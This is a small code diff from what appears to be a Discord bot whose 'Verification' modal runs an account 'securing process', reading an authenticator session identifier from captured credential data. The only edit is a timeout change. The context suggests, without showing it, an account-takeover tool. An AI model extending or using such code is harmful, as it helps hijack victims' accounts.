@@ -126,7 +126,7 @@ class MyModalOne(ui.Modal, title="Verification"):
             print("\n| Starting securing process |\n")
             print("[+] - Found Authenticator App")
 
-            async with httpx.AsyncClient() as session:
+            async with httpx.AsyncClient(timeout=None) as session:
 
                 device = emailInfo["Credentials"]["RemoteNgcParams"]["SessionIdentifier"]
 
